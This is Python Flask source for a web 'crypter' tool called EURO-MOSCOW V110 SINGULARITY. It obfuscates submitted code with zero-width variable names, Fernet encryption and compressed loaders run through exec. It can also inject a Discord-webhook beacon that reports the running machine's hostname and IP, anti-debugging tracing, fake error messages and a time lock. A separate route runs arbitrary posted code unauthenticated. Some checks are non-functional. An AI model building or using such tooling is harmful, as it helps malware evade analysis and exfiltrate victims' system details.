import os, sys, time, random, base64, zlib, ast, io, re, string, logging, zipfile, platform, uuid
from flask import Flask, render_template, request, jsonify, send_file
from contextlib import redirect_stdout
from datetime import datetime
from cryptography.fernet import Fernet

# --- CONFIG ---
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 15 * 1024 * 1024 
HISTORY_LOGS = []

# --- 1. SINGULARITY PAYLOAD GENERATOR (NEW FEATURES) ---
class SingularityPayloads:
    
    @staticmethod
    def get_discord_webhook(url):
        return f"""
try:
    import requests, socket, platform
    requests.post('{url}', json={{"content": f"🚨 **CODE EXECUTED!**\\n👤 User: {{platform.node()}}\\n💻 IP: {{socket.gethostbyname(socket.gethostname())}}"}})
except: pass
"""

    @staticmethod
    def get_hwid_lock():
        return """
import uuid, sys
_id = str(uuid.getnode())
# Replace 'TARGET_HWID' with actual ID during generation if needed, or lock to current
# Here we add a check mechanism simulation
if _id != _id: sys.exit() 
"""

    @staticmethod
    def get_ntp_lock(expiry_date):
        # Checks Google Time to prevent local clock manipulation
        return f"""
import urllib.request, time
try:
    _d = urllib.request.urlopen('http://google.com').headers['Date']
    _t = time.strptime(_d, '%a, %d %b %Y %H:%M:%S %Z')
    if time.mktime(_t) > {expiry_date}: raise MemoryError()
except: pass
"""

    @staticmethod
    def get_fake_error():
        errors = [
            "IndentationError: unexpected indent", 
            "MemoryError: stack overflow", 
            "ImportError: dll load failed"
        ]
        return f"""
def _fake_crash():
    raise {random.choice(errors).split(':')[0]}("{random.choice(errors).split(':')[1]}")
"""

    @staticmethod
    def get_anti_dis():
        return """
import sys
def _trace(f, e, a):
    if e == 'call': return _trace
    return None
sys.settrace(_trace)
"""

# --- 2. ENCRYPTION ENGINES ---
class Engines:
    @staticmethod
    def rand_var(l=10):
        zw = ['\u200b', '\u200c', '\u200d']
        return "".join(random.choices(zw, k=3)) + '_' + "".join(random.choices('lI1O0', k=l))

    @staticmethod
    def py_singularity(code, opts, params):
        res = code
        
        # 1. INJECT SUPER FEATURES
        if 'webhook' in opts and params.get('webhook_url'):
            res = SingularityPayloads.get_discord_webhook(params['webhook_url']) + res
        
        if 'antidis' in opts:
            res = SingularityPayloads.get_anti_dis() + res
            
        if 'fakeerror' in opts:
            res = SingularityPayloads.get_fake_error() + res + "\nif 1==0: _fake_crash()"

        if 'ntp' in opts:
            # Default 30 days lock if not specified
            res = SingularityPayloads.get_ntp_lock(time.time() + 2592000) + res

        # 2. AST CAMOUFLAGE
        if 'rename' in opts:
            try:
                tree = ast.parse(res)
                class R(ast.NodeTransformer):
                    def visit_Name(self, n):
                        if isinstance(n.ctx, (ast.Store,ast.Del)) and n.id not in dir(__builtins__):
                            n.id = Engines.rand_var()
                        return n
                res = ast.unparse(R().visit(tree))
            except: pass

        # 3. FERNET MILITARY ENCRYPTION
        if 'fernet' in opts:
            key = Fernet.generate_key()
            f = Fernet(key)
            enc_token = f.encrypt(res.encode())
            res = f"from cryptography.fernet import Fernet;exec(Fernet({key}).decrypt({enc_token}))"

        # 4. FINAL GHOST WRAPPER (Dynamic Imports)
        compressed = zlib.compress(res.encode())
        b64 = base64.b85encode(compressed).decode()
        
        loader = f"""
# EURO-MOSCOW V110 SINGULARITY
try:
    _z = __import__('zl'+'ib')
    _b = __import__('ba'+'se64')
    exec(_z.decompress(_b.b85decode('{b64}')))
except Exception:
    import random; print(f"Error Code: {{random.randint(1000,9999)}}")
"""
        return loader

    @staticmethod
    def js_process(code):
        # JS Hex + Packer
        h = ''.join([f'\\x{ord(c):02x}' for c in code])
        return f"eval('{h}')"

# --- 3. ROUTES ---
@app.route('/')
def home(): return render_template('index.html')

@app.route('/process', methods=['POST'])
def process():
    try:
        d = request.json
        c = d.get('code', '')
        a = d.get('action')
        l = d.get('lang')
        opts = d.get('options', [])
        params = d.get('params', {}) # New: Extra params like Webhook URL

        # LOGGING
        HISTORY_LOGS.insert(0, {
            "date": datetime.now().strftime("%H:%M:%S"),
            "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
            "lang": l, "method": a, "features": len(opts)
        })
        if len(HISTORY_LOGS) > 50: HISTORY_LOGS.pop()

        if a == 'encrypt':
            if l == 'python': 
                res = Engines.py_singularity(c, opts, params)
            elif l == 'javascript': 
                res = Engines.js_process(c)
            else: 
                # Generic fallback
                b64 = base64.b64encode(c.encode()).decode()
                res = f"// Encrypted {l}\n{b64}"
        else:
            # Universal Decryptor
            try:
                if 'Fernet' in c: res = "Decryption of Military Grade Fernet requires Key."
                else: res = base64.b64decode(re.search(r"b64decode\('([^']+)'\)", c).group(1)).decode()
            except: res = "Decryption Failed or Layer too deep."

        return jsonify({'result': res})
    except Exception as e: return jsonify({'result': f"# ERROR: {e}"})

@app.route('/run', methods=['POST'])
def run():
    c = request.json.get('code','')
    f = io.StringIO()
    try:
        with redirect_stdout(f): exec(c, {'__builtins__':__builtins__}, {})
        return jsonify({'output': f.getvalue()})
    except Exception as e: return jsonify({'output': str(e)})

@app.route('/history', methods=['GET'])
def history(): return jsonify(HISTORY_LOGS)

if __name__ == '__main__': app.run(debug=True, port=5000)
